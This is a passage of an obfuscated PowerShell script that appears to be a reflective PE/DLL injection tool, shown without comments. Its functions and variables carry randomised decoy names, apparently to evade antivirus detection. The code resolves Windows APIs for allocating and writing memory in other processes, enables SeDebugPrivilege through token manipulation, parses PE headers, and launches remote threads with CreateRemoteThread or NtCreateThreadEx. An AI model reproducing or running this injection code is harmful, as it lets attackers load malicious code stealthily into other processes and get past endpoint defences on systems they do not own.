		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function glorification
	{
		$EuQVwKhg99 = New-Object System.Object
		
		$UeVFsSzE99 = emphasizes kernel32.dll VirtualAlloc
		$wPHUbYYk99 = cataleptic @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$inYxPjxU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UeVFsSzE99, $wPHUbYYk99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name VirtualAlloc -Value $inYxPjxU99
		
		$bAQlIOuv99 = emphasizes kernel32.dll VirtualAllocEx
		$vDNJAiWy99 = cataleptic @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$hrnhyzIm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bAQlIOuv99, $vDNJAiWy99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $hrnhyzIm99
		
		$RgHTBJnH99 = emphasizes msvcrt.dll memcpy
		$EkYBsYpu99 = cataleptic @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$SUTxOmSh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RgHTBJnH99, $EkYBsYpu99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $SUTxOmSh99
		
		$sieTjkpG99 = emphasizes msvcrt.dll memset
		$NsDkGGxj99 = cataleptic @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$kGOXhhOC99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($sieTjkpG99, $NsDkGGxj99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name memset -Value $kGOXhhOC99
		
		$VESHXrdR99 = emphasizes kernel32.dll LoadLibraryA
		$SDEUbbfi99 = cataleptic @([String]) ([IntPtr])
		$POSRVWwQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VESHXrdR99, $SDEUbbfi99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $POSRVWwQ99
		
		$UHLjegRu99 = emphasizes kernel32.dll GetProcAddress
		$NdPPYvKl99 = cataleptic @([IntPtr], [String]) ([IntPtr])
		$TEhOeTwy99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UHLjegRu99, $NdPPYvKl99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $TEhOeTwy99
		
		$CISiUBNp99 = emphasizes kernel32.dll GetProcAddress
		$aeZacSch99 = cataleptic @([IntPtr], [IntPtr]) ([IntPtr])
		$CnVoPyJf99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CISiUBNp99, $aeZacSch99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $CnVoPyJf99
		
		$fdgkfBHY99 = emphasizes kernel32.dll VirtualFree
		$rjUJhXEO99 = cataleptic @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$QWZsWPab99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fdgkfBHY99, $rjUJhXEO99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name VirtualFree -Value $QWZsWPab99
		
		$egRMUNhh99 = emphasizes kernel32.dll VirtualFreeEx
		$UpuIdIZN99 = cataleptic @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$dKkiXjnm99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($egRMUNhh99, $UpuIdIZN99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $dKkiXjnm99
		
		$DlGGlCni99 = emphasizes kernel32.dll VirtualProtect
		$oiIyIOje99 = cataleptic @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VObnWLwi99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DlGGlCni99, $oiIyIOje99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name VirtualProtect -Value $VObnWLwi99
		
		$FHlQbOkv99 = emphasizes kernel32.dll GetModuleHandleA
		$LurznnHz99 = cataleptic @([String]) ([IntPtr])
		$fIkfcRHv99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FHlQbOkv99, $LurznnHz99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name GetModuleHandle -Value $fIkfcRHv99
		
		$qRNtaAWz99 = emphasizes kernel32.dll FreeLibrary
		$UkVPQvao99 = cataleptic @([IntPtr]) ([Bool])
		$QkWcLTHl99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qRNtaAWz99, $UkVPQvao99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $QkWcLTHl99
		
		$XZPlGsjJ99 = emphasizes kernel32.dll OpenProcess
	    $HiUGMbhu99 = cataleptic @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $bvyISQTU99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XZPlGsjJ99, $HiUGMbhu99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $bvyISQTU99
		
		$piyWWVfn99 = emphasizes kernel32.dll WaitForSingleObject
	    $eiNEGKJM99 = cataleptic @([IntPtr], [UInt32]) ([UInt32])
	    $StIjhWXs99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($piyWWVfn99, $eiNEGKJM99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $StIjhWXs99
		
		$bkXtlGKF99 = emphasizes kernel32.dll WriteProcessMemory
        $zkQnXAWd99 = cataleptic @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ddVtRhTZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bkXtlGKF99, $zkQnXAWd99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $ddVtRhTZ99
		
		$VsYtusCl99 = emphasizes kernel32.dll ReadProcessMemory
        $HIEsJNkz99 = cataleptic @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $aOEurmyo99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VsYtusCl99, $HIEsJNkz99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $aOEurmyo99
		
		$VxricDoN99 = emphasizes kernel32.dll CreateRemoteThread
        $ePYVWKzO99 = cataleptic @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $iVeeWRKz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VxricDoN99, $ePYVWKzO99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $iVeeWRKz99
		
		$YvaupLuD99 = emphasizes kernel32.dll GetExitCodeThread
        $kzCetlBc99 = cataleptic @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $mHZFUaop99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YvaupLuD99, $kzCetlBc99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $mHZFUaop99
		
		$wddGfJSk99 = emphasizes Advapi32.dll OpenThreadToken
        $RSLaHxCe99 = cataleptic @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $ekuYVCuy99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wddGfJSk99, $RSLaHxCe99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $ekuYVCuy99
		
		$igVIPVIr99 = emphasizes kernel32.dll GetCurrentThread
        $GuJJHToT99 = cataleptic @() ([IntPtr])
        $AMkOJBqJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($igVIPVIr99, $GuJJHToT99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $AMkOJBqJ99
		
		$WNMhdLjB99 = emphasizes Advapi32.dll AdjustTokenPrivileges
        $BNPuNwev99 = cataleptic @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $DOrNleQv99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WNMhdLjB99, $BNPuNwev99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $DOrNleQv99
		
		$nGckxPTh99 = emphasizes Advapi32.dll LookupPrivilegeValueA
        $UtgefAZF99 = cataleptic @([String], [String], [IntPtr]) ([Bool])
        $VCxCtTQp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($nGckxPTh99, $UtgefAZF99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $VCxCtTQp99
		
		$lKbUZHnf99 = emphasizes Advapi32.dll ImpersonateSelf
        $CyqKpiud99 = cataleptic @([Int32]) ([Bool])
        $YzmfrYmO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lKbUZHnf99, $CyqKpiud99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $YzmfrYmO99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $XxDcjlER99 = emphasizes NtDll.dll NtCreateThreadEx
            $dZbszLAJ99 = cataleptic @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $akIFKlvp99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($XxDcjlER99, $dZbszLAJ99)
		    $EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $akIFKlvp99
        }
		
		$DhmzOPGU99 = emphasizes Kernel32.dll IsWow64Process
        $CuxGlXFr99 = cataleptic @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $WKSNUKzO99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DhmzOPGU99, $CuxGlXFr99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $WKSNUKzO99
		
		$qUuusTgw99 = emphasizes Kernel32.dll CreateThread
        $NGQVbWdi99 = cataleptic @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $oAGIEaBv99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($qUuusTgw99, $NGQVbWdi99)
		$EuQVwKhg99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $oAGIEaBv99
	
		$TjGOonUh99 = emphasizes kernel32.dll VirtualFree
		$BmFiHdXM99 = cataleptic @([IntPtr])
		$xNSdpqjJ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TjGOonUh99, $BmFiHdXM99)
		$EuQVwKhg99 | Add-Member NoteProperty -Name LocalFree -Value $xNSdpqjJ99
		return $EuQVwKhg99
	}
			
	Function roads
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$zPRNgTKV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$KbleYsvh99
		)
		
		[Byte[]]$fAeBrLGh99 = [BitConverter]::GetBytes($zPRNgTKV99)
		[Byte[]]$xuHozYsd99 = [BitConverter]::GetBytes($KbleYsvh99)
		[Byte[]]$FhAomoFx99 = [BitConverter]::GetBytes([UInt64]0)
		if ($fAeBrLGh99.Count -eq $xuHozYsd99.Count)
		{
			$SvfrrTQp99 = 0
			for ($i = 0; $i -lt $fAeBrLGh99.Count; $i++)
			{
				$Val = $fAeBrLGh99[$i] - $SvfrrTQp99
				if ($Val -lt $xuHozYsd99[$i])
				{
					$Val += 256
					$SvfrrTQp99 = 1
				}
				else
				{
					$SvfrrTQp99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $xuHozYsd99[$i]
				$FhAomoFx99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FhAomoFx99, 0)
	}
	
	Function palmettoes
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$zPRNgTKV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$KbleYsvh99
		)
		
		[Byte[]]$fAeBrLGh99 = [BitConverter]::GetBytes($zPRNgTKV99)
		[Byte[]]$xuHozYsd99 = [BitConverter]::GetBytes($KbleYsvh99)
		[Byte[]]$FhAomoFx99 = [BitConverter]::GetBytes([UInt64]0)
		if ($fAeBrLGh99.Count -eq $xuHozYsd99.Count)
		{
			$SvfrrTQp99 = 0
			for ($i = 0; $i -lt $fAeBrLGh99.Count; $i++)
			{
				[UInt16]$Sum = $fAeBrLGh99[$i] + $xuHozYsd99[$i] + $SvfrrTQp99
				$FhAomoFx99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$SvfrrTQp99 = 1
				}
				else
				{
					$SvfrrTQp99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FhAomoFx99, 0)
	}
	
	Function threshed
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$zPRNgTKV99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$KbleYsvh99
		)
		
		[Byte[]]$fAeBrLGh99 = [BitConverter]::GetBytes($zPRNgTKV99)
		[Byte[]]$xuHozYsd99 = [BitConverter]::GetBytes($KbleYsvh99)
		if ($fAeBrLGh99.Count -eq $xuHozYsd99.Count)
		{
			for ($i = $fAeBrLGh99.Count-1; $i -ge 0; $i--)
			{
				if ($fAeBrLGh99[$i] -gt $xuHozYsd99[$i])
				{
					return $true
				}
				elseif ($fAeBrLGh99[$i] -lt $xuHozYsd99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function extremity
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$sTIVnowa99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($sTIVnowa99, 0))
	}
	
	
	Function irks
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$kHEpjpgv99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$RBNHqpPw99 = [IntPtr](palmettoes ($StartAddress) ($Size))
		
		$QQmhTCxH99 = $PEInfo.EndAddress
		
		if ((threshed ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $kHEpjpgv99"
		}
		if ((threshed ($RBNHqpPw99) ($QQmhTCxH99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $kHEpjpgv99"
		}
	}
	
	
	Function faculty
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$lBrBChbE99
		)
	
		for ($wNESmgDp99 = 0; $wNESmgDp99 -lt $Bytes.Length; $wNESmgDp99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($lBrBChbE99, $wNESmgDp99, $Bytes[$wNESmgDp99])
		}
	}
	
	Function cataleptic
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $VUTPTbis99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $wEtTgZWH99 = [AppDomain]::CurrentDomain
	    $LfHFVhSU99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $lPSlbcrg99 = $wEtTgZWH99.DefineDynamicAssembly($LfHFVhSU99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $AxvyPMyh99 = $lPSlbcrg99.DefineDynamicModule('InMemoryModule', $false)
	    $hDIAYHlj99 = $AxvyPMyh99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $oAbyJvnO99 = $hDIAYHlj99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $VUTPTbis99)
	    $oAbyJvnO99.SetImplementationFlags('Runtime, Managed')
	    $chsYwWDk99 = $hDIAYHlj99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $VUTPTbis99)
	    $chsYwWDk99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $hDIAYHlj99.CreateType()
	}
	Function emphasizes
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $vsWnzhHH99
	    )
	    $nuIDYGcO99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $WeipuxJx99 = $nuIDYGcO99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $fIkfcRHv99 = $WeipuxJx99.GetMethod('GetModuleHandle')
	    $TEhOeTwy99 = $WeipuxJx99.GetMethod('GetProcAddress')
	    $uZndlEFP99 = $fIkfcRHv99.Invoke($null, @($Module))
	    $ViUUeBQx99 = New-Object IntPtr
	    $MgmuRTkG99 = New-Object System.Runtime.InteropServices.HandleRef($ViUUeBQx99, $uZndlEFP99)
	    Write-Output $TEhOeTwy99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$MgmuRTkG99, $vsWnzhHH99))
	}
	
	
	Function prates
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$DufdvQjy99 = $EuQVwKhg99.GetCurrentThread.Invoke()
		if ($DufdvQjy99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$QbqIphQL99 = [IntPtr]::Zero
		[Bool]$BKfwcaqY99 = $EuQVwKhg99.OpenThreadToken.Invoke($DufdvQjy99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$QbqIphQL99)
		if ($BKfwcaqY99 -eq $false)
		{
			$mrDuYGkI99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($mrDuYGkI99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$BKfwcaqY99 = $EuQVwKhg99.ImpersonateSelf.Invoke(3)
				if ($BKfwcaqY99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$BKfwcaqY99 = $EuQVwKhg99.OpenThreadToken.Invoke($DufdvQjy99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$QbqIphQL99)
				if ($BKfwcaqY99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $mrDuYGkI99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.LUID))
		$BKfwcaqY99 = $EuQVwKhg99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($BKfwcaqY99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$WQCiKrTO99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.TOKEN_PRIVILEGES)
		[IntPtr]$hiWHgqZz99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WQCiKrTO99)
		$PmlbEGiv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($hiWHgqZz99, [Type]$zAfvSIaE99.TOKEN_PRIVILEGES)
		$PmlbEGiv99.PrivilegeCount = 1
		$PmlbEGiv99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$zAfvSIaE99.LUID)
		$PmlbEGiv99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($PmlbEGiv99, $hiWHgqZz99, $true)
		$BKfwcaqY99 = $EuQVwKhg99.AdjustTokenPrivileges.Invoke($QbqIphQL99, $false, $hiWHgqZz99, $WQCiKrTO99, [IntPtr]::Zero, [IntPtr]::Zero)
		$mrDuYGkI99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($BKfwcaqY99 -eq $false) -or ($mrDuYGkI99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($hiWHgqZz99)
	}
	
	
	Function splodge
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$aqRPkUMM99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$GzXyRVTP99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$EuQVwKhg99
		)
		
		[IntPtr]$svTIcPeq99 = [IntPtr]::Zero
		
		$afuMGWEu99 = [Environment]::OSVersion.Version
		if (($afuMGWEu99 -ge (New-Object 'Version' 6,0)) -and ($afuMGWEu99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$OHpdgcey99= $EuQVwKhg99.NtCreateThreadEx.Invoke([Ref]$svTIcPeq99, 0x1FFFFF, [IntPtr]::Zero, $aqRPkUMM99, $StartAddress, $GzXyRVTP99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$DlInamrR99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($svTIcPeq99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $OHpdgcey99. LastError: $DlInamrR99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$svTIcPeq99 = $EuQVwKhg99.CreateRemoteThread.Invoke($aqRPkUMM99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $GzXyRVTP99, 0, [IntPtr]::Zero)
		}
		
		if ($svTIcPeq99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $svTIcPeq99
	}
	
	Function weakened
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$EbqIceBD99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99
		)
		
		$aHjsvoBp99 = New-Object System.Object
		
		$fUeVMCQO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($EbqIceBD99, [Type]$zAfvSIaE99.IMAGE_DOS_HEADER)
		[IntPtr]$vpaRKbos99 = [IntPtr](palmettoes ([Int64]$EbqIceBD99) ([Int64][UInt64]$fUeVMCQO99.e_lfanew))
		$aHjsvoBp99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $vpaRKbos99
		$PcTWnCnz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vpaRKbos99, [Type]$zAfvSIaE99.IMAGE_NT_HEADERS64)
		
	    if ($PcTWnCnz99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($PcTWnCnz99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$aHjsvoBp99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $PcTWnCnz99
			$aHjsvoBp99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$sQmPazyp99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($vpaRKbos99, [Type]$zAfvSIaE99.IMAGE_NT_HEADERS32)
			$aHjsvoBp99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $sQmPazyp99
			$aHjsvoBp99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $aHjsvoBp99
	}
	Function villainous
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$xcecESTK99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$KlmIsNoM99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($xcecESTK99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($xcecESTK99, 0, $KlmIsNoM99, $xcecESTK99.Length) | Out-Null
		
		$aHjsvoBp99 = weakened -PEHandle $KlmIsNoM99 -Win32Types $zAfvSIaE99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($aHjsvoBp99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($aHjsvoBp99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($aHjsvoBp99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($aHjsvoBp99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($aHjsvoBp99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($KlmIsNoM99)
		
		return $PEInfo
	}
	Function nonconductor
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$EbqIceBD99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$zAfvSIaE99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($EbqIceBD99 -eq $null -or $EbqIceBD99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
